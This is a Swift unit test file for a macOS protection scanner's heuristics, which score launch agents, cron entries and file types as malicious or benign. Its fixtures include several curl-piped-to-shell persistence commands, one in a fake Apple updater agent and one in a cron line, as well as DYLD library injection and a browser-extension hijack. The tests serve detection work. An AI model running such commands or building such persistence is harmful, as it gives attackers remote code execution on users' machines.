import Foundation
import XCTest
@testable import SpruceCore

final class ProtectionHeuristicsTests: XCTestCase {
    var fx: ProtectionFixture!

    override func setUp() {
        super.setUp()
        fx = ProtectionFixture()
    }

    override func tearDown() {
        fx.remove()
        super.tearDown()
    }

    // MARK: Names

    func testRandomNameDetection() {
        XCTAssertTrue(ProtectionHeuristics.looksRandom("com.wznlVRt83Jsd.HPyT0b4Hwxh.plist"))
        XCTAssertTrue(ProtectionHeuristics.looksRandom("xkqzvbtrmwpl"))
        XCTAssertTrue(ProtectionHeuristics.looksRandom("Qh7rTz9kLm2x"))
        for name in ["com.google.keystone.agent.plist", "homebrew.mxcl.postgresql@14.plist", "com.ElementarySignalSearch.service",
                     "us.zoom.ZoomDaemon.plist", "com.microsoft.autoupdate.helper", "Office365Sync", "com.docker.vmnetd",
                     "0A1B2C3D-1111-2222-3333-444455556666", "deadbeefcafebabe1234", "com.MapperState.system",
                     "com.adobe.ARMDC.Communicator.plist", "com.github.GitHubClient.ShipIt"] {
            XCTAssertFalse(ProtectionHeuristics.looksRandom(name), name)
        }
    }

    // MARK: Path traits

    func testPathTraits() {
        let space = fx.space
        let hidden = ProtectionHeuristics.traits(of: fx.path("~/.secret/agent"), space: space)
        XCTAssertTrue(hidden.inHiddenFolder)
        XCTAssertFalse(hidden.inDeveloperFolder)

        let cargo = ProtectionHeuristics.traits(of: fx.path("~/.cargo/bin/ripgrep"), space: space)
        XCTAssertTrue(cargo.inDeveloperFolder)
        XCTAssertFalse(cargo.inHiddenFolder)

        let adload = ProtectionHeuristics.traits(of: fx.path("~/Library/Application Support/.abc/Services/x"), space: space)
        XCTAssertTrue(adload.inHiddenApplicationSupportFolder)

        let tmp = ProtectionHeuristics.traits(of: fx.path("/private/tmp/x"), space: space)
        XCTAssertTrue(tmp.inTemporaryFolder)

        let root = ProtectionHeuristics.traits(of: fx.path("~/.helper"), space: space)
        XCTAssertTrue(root.inHomeRoot)
        XCTAssertTrue(root.isHiddenFile)

        let brew = ProtectionHeuristics.traits(of: fx.path("/opt/homebrew/bin/redis-server"), space: space)
        XCTAssertTrue(brew.inPackageManager)
    }

    // MARK: Launch items

    func testLaunchItemParsingAndPayload() {
        let plist = fx.launchPlist("~/Library/LaunchAgents/a.plist", label: "com.example.a",
                                   arguments: ["/bin/bash", "-l", "~/Library/Scripts/run.sh"], keepAlive: true,
                                   environment: ["DYLD_INSERT_LIBRARIES": "/tmp/x.dylib"])
        let item = ProtectionLaunchItem.parse(path: plist, domain: .user, kind: .launchAgent, home: fx.home)
        XCTAssertTrue(item.isValidPlist)
        XCTAssertEqual(item.label, "com.example.a")
        XCTAssertEqual(item.interpreter, "bash")
        XCTAssertEqual(item.payloadPath, fx.home + "/Library/Scripts/run.sh")
        XCTAssertTrue(item.keepAlive)
        XCTAssertEqual(item.environment["DYLD_INSERT_LIBRARIES"], "/tmp/x.dylib")

        let envPlist = fx.launchPlist("~/Library/LaunchAgents/b.plist", label: "b",
                                      arguments: ["/usr/bin/env", "python3", "/Users/Shared/x.py"])
        let envItem = ProtectionLaunchItem.parse(path: envPlist, domain: .user, kind: .launchAgent, home: fx.home)
        XCTAssertEqual(envItem.interpreter, "python3")
        XCTAssertEqual(envItem.payloadPath, "/Users/Shared/x.py")

        let inlinePlist = fx.launchPlist("~/Library/LaunchAgents/c.plist", label: "c",
                                         arguments: ["/bin/sh", "-c", "curl -s http://x | sh"])
        let inline = ProtectionLaunchItem.parse(path: inlinePlist, domain: .user, kind: .launchAgent, home: fx.home)
        XCTAssertEqual(inline.inlineCommand, "curl -s http://x | sh")
        XCTAssertNil(inline.payloadPath)

        let programPlist = fx.plist("~/Library/LaunchAgents/d.plist", ["Label": "d", "Program": "/Applications/D.app/Contents/MacOS/D"])
        let program = ProtectionLaunchItem.parse(path: programPlist, domain: .user, kind: .launchAgent, home: fx.home)
        XCTAssertNil(program.interpreter)
        XCTAssertEqual(program.payloadPath, "/Applications/D.app/Contents/MacOS/D")

        let garbage = fx.file("~/Library/LaunchAgents/e.plist", Data("FasdUAS 1.101.10".utf8))
        let invalid = ProtectionLaunchItem.parse(path: garbage, domain: .user, kind: .launchAgent, home: fx.home)
        XCTAssertFalse(invalid.isValidPlist)
    }

    func testMaliciousLaunchAgentScoresHigh() {
        let binary = fx.machO("~/.cache_x9/agentd")
        _ = binary
        let plist = fx.launchPlist("~/Library/LaunchAgents/com.wznlVRt83Jsd.HPyT0b4Hwxh.plist",
                                   label: "com.wznlVRt83Jsd.HPyT0b4Hwxh",
                                   arguments: [fx.path("~/.cache_x9/agentd")], keepAlive: true)
        let item = ProtectionLaunchItem.parse(path: plist, domain: .user, kind: .launchAgent, home: fx.home)
        let ctx = ProtectionHeuristics.LaunchContext(item: item, payloadSigning: ProtectionSigningInfo(status: .unsigned),
                                                     payloadExists: true, payloadType: .machO, payloadText: nil)
        let score = ProtectionHeuristics.evaluate(ctx, space: fx.space)
        XCTAssertGreaterThanOrEqual(score.value, 80)
        XCTAssertTrue(score.sortedReasons.contains { $0.contains("invisible folder") })
        XCTAssertTrue(score.sortedReasons.contains { $0.contains("isn't code-signed") })
    }

    func testBenignLaunchAgentsScoreZero() {
        // Signed app helper.
        let exe = fx.machO("/Applications/Tool.app/Contents/MacOS/Tool")
        let plist = fx.launchPlist("~/Library/LaunchAgents/com.vendor.tool.plist", label: "com.vendor.tool", arguments: [exe])
        let item = ProtectionLaunchItem.parse(path: plist, domain: .user, kind: .launchAgent, home: fx.home)
        let signed = ProtectionHeuristics.LaunchContext(item: item, payloadSigning: ProtectionSigningInfo(status: .signed, teamID: "ABCDE12345"),
                                                        payloadExists: true, payloadType: .machO, payloadText: nil)
        XCTAssertEqual(ProtectionHeuristics.evaluate(signed, space: fx.space).value, 0)

        // Homebrew services are ad-hoc signed by design.
        let brewPlist = fx.launchPlist("~/Library/LaunchAgents/homebrew.mxcl.redis.plist", label: "homebrew.mxcl.redis",
                                       arguments: ["/opt/homebrew/opt/redis/bin/redis-server"])
        let brew = ProtectionLaunchItem.parse(path: brewPlist, domain: .user, kind: .launchAgent, home: fx.home)
        let brewCtx = ProtectionHeuristics.LaunchContext(item: brew, payloadSigning: ProtectionSigningInfo(status: .adHoc),
                                                         payloadExists: true, payloadType: .machO, payloadText: nil)
        XCTAssertEqual(ProtectionHeuristics.evaluate(brewCtx, space: fx.space).value, 0)

        // A job whose program no longer exists can't run.
        let missingPlist = fx.launchPlist("~/Library/LaunchAgents/com.gone.plist", label: "com.gone",
                                          arguments: [fx.path("~/.gone/x")])
        let missing = ProtectionLaunchItem.parse(path: missingPlist, domain: .user, kind: .launchAgent, home: fx.home)
        let missingCtx = ProtectionHeuristics.LaunchContext(item: missing, payloadSigning: nil, payloadExists: false,
                                                            payloadType: nil, payloadText: nil)
        XCTAssertEqual(ProtectionHeuristics.evaluate(missingCtx, space: fx.space).value, 0)
    }

    func testBehaviouralSignals() {
        let plist = fx.launchPlist("~/Library/LaunchAgents/com.helper.update.plist", label: "com.helper.update",
                                   arguments: ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
                                               "--load-extension=/private/var/tmp/ext"])
        let item = ProtectionLaunchItem.parse(path: plist, domain: .user, kind: .launchAgent, home: fx.home)
        let ctx = ProtectionHeuristics.LaunchContext(item: item, payloadSigning: ProtectionSigningInfo(status: .signed, teamID: "EQHXZ8M8AV"),
                                                     payloadExists: true, payloadType: .machO, payloadText: nil)
        let score = ProtectionHeuristics.evaluate(ctx, space: fx.space)
        XCTAssertGreaterThanOrEqual(score.value, 50)
        XCTAssertEqual(score.category, .browserHijacker)

        let fake = fx.launchPlist("~/Library/LaunchAgents/com.apple.updater.plist", label: "com.apple.updater",
                                  arguments: ["/bin/sh", "-c", "curl -fsSL http://x/y | bash"])
        let fakeItem = ProtectionLaunchItem.parse(path: fake, domain: .user, kind: .launchAgent, home: fx.home)
        let fakeCtx = ProtectionHeuristics.LaunchContext(item: fakeItem, payloadSigning: nil, payloadExists: false,
                                                         payloadType: nil, payloadText: nil)
        let fakeScore = ProtectionHeuristics.evaluate(fakeCtx, space: fx.space)
        XCTAssertGreaterThanOrEqual(fakeScore.value, 80)
        XCTAssertTrue(fakeScore.sortedReasons.contains { $0.contains("Apple") })
    }

    func testCronEvaluation() {
        let bad = ProtectionCronEntry(line: "*/5 * * * * curl -s http://x/p | bash", schedule: "*/5 * * * *",
                                      command: "curl -s http://x/p | bash")
        XCTAssertGreaterThanOrEqual(ProtectionHeuristics.evaluateCron(bad, space: fx.space).value, 50)
        let ok = ProtectionCronEntry(line: "0 3 * * * /usr/local/bin/backup.sh", schedule: "0 3 * * *",
                                     command: "/usr/local/bin/backup.sh")
        XCTAssertEqual(ProtectionHeuristics.evaluateCron(ok, space: fx.space).value, 0)
    }

    func testFileSniffer() {
        let macho = fx.machO("~/bin/tool")
        XCTAssertEqual(ProtectionFileSniffer.type(of: macho), .machO)
        let script = fx.text("~/bin/run", "#!/usr/bin/env python3\nprint(1)\n", executable: true)
        XCTAssertEqual(ProtectionFileSniffer.type(of: script), .script(interpreter: "python3"))
        let dmg = fx.file("~/Downloads/x.dmg")
        XCTAssertEqual(ProtectionFileSniffer.type(of: dmg), .diskImage)
        let text = fx.text("~/notes.txt", "hello")
        XCTAssertEqual(ProtectionFileSniffer.type(of: text), .other)
        XCTAssertTrue(ProtectionFileSniffer.isExecutable(path: script, type: .script(interpreter: "python3")))
        XCTAssertFalse(ProtectionFileSniffer.isExecutable(path: text, type: .other))
    }
}
